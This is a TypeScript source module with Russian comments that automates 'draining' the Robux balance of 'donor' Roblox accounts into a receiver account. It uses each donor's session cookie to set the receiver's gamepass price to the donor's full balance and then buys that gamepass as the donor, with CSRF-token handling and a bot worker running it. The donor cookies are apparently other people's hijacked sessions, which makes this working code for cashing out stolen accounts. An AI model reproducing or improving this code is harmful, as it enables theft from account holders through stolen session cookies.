/**
 * Механика «слива» остатка донора в аккаунт-приёмник — порт из
 * src/app/api/twa/drain/route.ts (эндпоинт смены цены верифицирован вживую
 * 2026-07-03: universe-scoped PATCH, multipart/form-data, 204).
 *
 * Поток: баланс донора → выставить цену геймпасса приёмника = балансу →
 * дождаться, пока Roblox отразит цену → донор покупает геймпасс. Остаток
 * консолидируется у приёмника (минус стандартные 30% маркетплейса).
 *
 * Используется автослив-воркером (bots/tg/auto-workers.ts). Ручной слив
 * остаётся в TWA — там свой экземпляр той же механики.
 */

const ROBLOX_UA = { "User-Agent": "Roblox/WinInet", Accept: "application/json" };

export interface DrainOutcome {
  success: boolean;
  msg: string;
  drained?: number;
  gamepassId?: string;
  donorBalanceAfter?: number | null;
  drainBalanceAfter?: number | null;
}

export async function drainAuthedUser(cookie: string): Promise<{ id: number; name: string } | null> {
  try {
    const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
      signal: AbortSignal.timeout(10_000),
    });
    if (!r.ok) return null;
    const d: any = await r.json().catch(() => null);
    return d?.id ? { id: d.id, name: d.name ?? d.displayName ?? "?" } : null;
  } catch { return null; }
}

export async function drainCurrency(cookie: string): Promise<number | null> {
  try {
    const r = await fetch("https://economy.roblox.com/v1/user/currency", {
      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
      signal: AbortSignal.timeout(8_000),
    });
    if (!r.ok) return null;
    const d: any = await r.json().catch(() => null);
    return d?.robux ?? null;
  } catch { return null; }
}

async function productInfo(gpId: string): Promise<any | null> {
  const urls = [
    `https://apis.roblox.com/game-passes/v1/game-passes/${gpId}/product-info`,
    `https://apis.roproxy.com/game-passes/v1/game-passes/${gpId}/product-info`,
  ];
  for (const url of urls) {
    try {
      const r = await fetch(url, { headers: ROBLOX_UA, signal: AbortSignal.timeout(8_000) });
      if (r.ok) return await r.json();
    } catch { /* try next */ }
  }
  return null;
}

/** Геймпассы приёмника (кандидаты на слив). */
export async function drainUserGamepasses(userId: number, cookie: string): Promise<{ gamepassId: string; name: string }[]> {
  try {
    const r = await fetch(`https://apis.roblox.com/game-passes/v1/users/${userId}/game-passes?count=50`, {
      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
      signal: AbortSignal.timeout(10_000),
    });
    if (!r.ok) return [];
    const d: any = await r.json().catch(() => null);
    const arr = Array.isArray(d?.gamePasses) ? d.gamePasses : [];
    return arr.map((g: any) => ({ gamepassId: String(g.gamePassId), name: g.name ?? "Gamepass" }));
  } catch { return []; }
}

/**
 * Владеет ли юзер геймпассом. Грабли «один пасс = один слив на донора»:
 * Roblox не даёт купить пасс повторно, поэтому автослив выбирает пасс,
 * которым донор ещё НЕ владеет. null = проверка не удалась (пасс пропускаем).
 */
export async function ownsGamepass(userId: number, gpId: string): Promise<boolean | null> {
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${gpId}`, {
      headers: ROBLOX_UA, signal: AbortSignal.timeout(8_000),
    });
    if (!r.ok) return null;
    const d: any = await r.json().catch(() => null);
    return Array.isArray(d?.data) ? d.data.length > 0 : null;
  } catch { return null; }
}

async function getCsrf(cookie: string): Promise<string | null> {
  const r = await fetch("https://auth.roblox.com/v2/logout", {
    method: "POST",
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    signal: AbortSignal.timeout(10_000),
  }).catch(() => null);
  return r?.headers.get("x-csrf-token") ?? null;
}

async function resolveUniverse(cookie: string, gpId: string): Promise<number | null> {
  let placeId: number | undefined;
  try {
    const r = await fetch(`https://apis.roblox.com/game-passes/v1/game-passes/${gpId}/details`, {
      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
      signal: AbortSignal.timeout(10_000),
    });
    if (r.ok) placeId = ((await r.json()) as any)?.placeId;
  } catch { /* fall through */ }
  if (!placeId) return null;
  try {
    const r = await fetch(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`, {
      headers: ROBLOX_UA, signal: AbortSignal.timeout(10_000),
    });
    if (r.ok) return ((await r.json()) as any)?.universeId ?? null;
  } catch { /* fall through */ }
  return null;
}

/** Смена цены: universe-scoped PATCH, ТОЛЬКО multipart/form-data (JSON → 415). */
async function setGamepassPrice(cookie: string, csrf: string, gpId: string, price: number): Promise<{ ok: boolean; detail: string }> {
  const universeId = await resolveUniverse(cookie, gpId);
  if (!universeId) return { ok: false, detail: "universeId геймпасса не получен" };

  const fd = new FormData();
  fd.append("IsForSale", String(price > 0));
  fd.append("Price", String(Math.floor(price)));

  let status = 0, body = "";
  try {
    const r = await fetch(`https://apis.roblox.com/game-passes/v1/universes/${universeId}/game-passes/${gpId}`, {
      method: "PATCH",
      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, "X-CSRF-TOKEN": csrf },
      body: fd,
      signal: AbortSignal.timeout(12_000),
    });
    status = r.status;
    body = (await r.text().catch(() => "")).slice(0, 200);
    if (r.ok) return { ok: true, detail: String(status) };
  } catch (e: any) {
    body = String(e?.message ?? e).slice(0, 120);
  }
  return { ok: false, detail: `[${status}] ${body}` };
}

/**
 * Полный слив: цена пасса приёмника = баланс донора → поллинг цены →
 * покупка донором. Возвращает честный исход; ничего не пишет в БД —
 * DrainEvent/алерты — на вызывающей стороне.
 */
export async function runDrain(donorCookie: string, drainCookie: string, gpId: string): Promise<DrainOutcome> {
  const target = await drainCurrency(donorCookie);
  if (target === null) return { success: false, msg: "Не удалось прочитать баланс донора — cookie протух?" };
  if (target < 1) return { success: false, msg: "Нечего сливать (баланс донора 0)" };

  const info = await productInfo(gpId);
  if (!info?.ProductId) return { success: false, msg: "product-info геймпасса недоступен" };
  const productId = info.ProductId as number;
  const sellerId = info.Creator?.Id ?? info.Creator?.CreatorTargetId ?? 0;
  if (!sellerId) return { success: false, msg: "Не удалось определить продавца геймпасса" };

  const drainCsrf = await getCsrf(drainCookie);
  if (!drainCsrf) return { success: false, msg: "CSRF приёмника не получен — cookie протух?" };

  const priceRes = await setGamepassPrice(drainCookie, drainCsrf, gpId, target);
  if (!priceRes.ok) return { success: false, msg: `Не удалось сменить цену геймпасса (${priceRes.detail})` };

  // Roblox отражает новую цену с задержкой — поллим до ~15 с.
  let priced = false;
  for (let i = 0; i < 12; i++) {
    await new Promise((r) => setTimeout(r, 1200));
    const chk = await productInfo(gpId);
    if ((chk?.PriceInRobux ?? -1) === target && chk?.IsForSale) { priced = true; break; }
  }
  if (!priced) return { success: false, msg: "Цена сменена, но не подтвердилась за ~15с. Повторим следующим тиком." };

  let donorCsrf = await getCsrf(donorCookie);
  if (!donorCsrf) return { success: false, msg: "CSRF донора не получен — cookie протух?" };

  let purchaseRes: Response | null = null;
  for (let attempt = 0; attempt < 2; attempt++) {
    purchaseRes = await fetch(`https://economy.roblox.com/v1/purchases/products/${productId}`, {
      method: "POST",
      headers: {
        Cookie: `.ROBLOSECURITY=${donorCookie}`,
        "Content-Type": "application/json",
        "x-csrf-token": donorCsrf!,
      },
      body: JSON.stringify({ expectedCurrency: 1, expectedPrice: target, expectedSellerId: sellerId }),
      signal: AbortSignal.timeout(15_000),
    }).catch(() => null);
    if (purchaseRes?.status === 403) {
      const newCsrf = purchaseRes.headers.get("x-csrf-token");
      if (newCsrf && attempt === 0) { donorCsrf = newCsrf; continue; }
    }
    break;
  }

  if (purchaseRes?.status === 401) return { success: false, msg: "Cookie донора истёк — обнови" };

  const pData: any = await purchaseRes?.json().catch(() => null);
  const [donorAfter, drainAfter] = await Promise.all([drainCurrency(donorCookie), drainCurrency(drainCookie)]);

  if (pData?.purchased) {
    return {
      success: true,
      msg: `Слито ${pData.price ?? target} R$`,
      drained: pData.price ?? target,
      gamepassId: gpId,
      donorBalanceAfter: donorAfter,
      drainBalanceAfter: drainAfter,
    };
  }
  return {
    success: false,
    msg: `Покупка не прошла: ${pData?.reason ?? pData?.errorMsg ?? "Неизвестная ошибка"}`,
    donorBalanceAfter: donorAfter,
    drainBalanceAfter: drainAfter,
  };
}
